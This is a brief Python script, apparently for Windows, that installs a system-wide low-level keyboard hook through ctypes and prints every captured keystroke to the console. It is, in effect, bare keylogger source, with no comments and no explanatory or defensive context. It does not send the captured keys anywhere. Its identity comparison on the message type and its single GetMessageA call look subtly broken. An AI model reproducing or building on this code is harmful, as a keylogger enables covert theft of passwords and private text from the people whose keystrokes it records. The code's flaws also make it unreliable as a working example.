from ctypes import *
from ctypes.wintypes import MSG

kernel32 = windll.kernel32
user32 = windll.user32

KEYDOWN = 0x0100
def hook(nCode,wParam,lParam):
    if wParam is not KEYDOWN:
        return user32.CallNextHookEx(hooked,nCode,
                                     wParam,lParam)

    if lParam[0]==190:
        print('.',end=" ")
    else:
        tecla = chr(lParam[0])
        print(tecla,end=" ")
    return user32.CallNextHookEx(hooked,nCode,
                                     wParam,lParam)

CMPFUNC = CFUNCTYPE(c_int,c_int,c_int,POINTER(c_void_p))
pointer = CMPFUNC(hook)
hooked = user32.SetWindowsHookExA(13,pointer,
                                  kernel32.GetModuleHandleW(None),
                                  0)

msg = MSG()
user32.GetMessageA(byref(msg),None,0,0)


